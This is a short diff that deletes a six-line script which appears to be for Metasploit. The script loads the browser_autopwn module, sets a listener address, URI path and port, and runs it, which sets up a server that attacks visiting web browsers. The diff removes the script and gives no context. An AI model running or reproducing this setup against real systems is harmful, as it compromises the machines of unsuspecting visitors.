@@ -1,6 +1,0 @@
-use server/browser_autopwn
-set LHOST 10.31.33.74
-set uripath /
-set uripath /
-set srvport 8080
-run
